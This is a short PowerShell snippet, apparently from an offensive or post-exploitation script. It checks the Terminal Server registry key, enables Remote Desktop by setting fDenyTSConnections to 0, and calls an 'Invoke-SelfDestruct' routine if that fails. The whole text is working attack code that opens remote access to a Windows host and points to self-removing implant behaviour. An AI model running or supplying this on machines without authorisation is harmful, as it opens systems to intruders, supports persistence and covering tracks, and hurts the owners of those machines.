Write-Host "[*] Checking if RDP is enabled.";if ((Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections").fDenyTSConnections -eq 1) {Write-Host "[*] RDP is disabled. Attempting to enable RDP.";Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections" -Value 0;if ((Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections").fDenyTSConnections -eq 1){Write-Host "[-] Failed to enable RDP.";Invoke-SelfDestruct}else {Write-Host "[+] Successfully enabled RDP."}}else {Write-Host "[*] RDP is enabled."}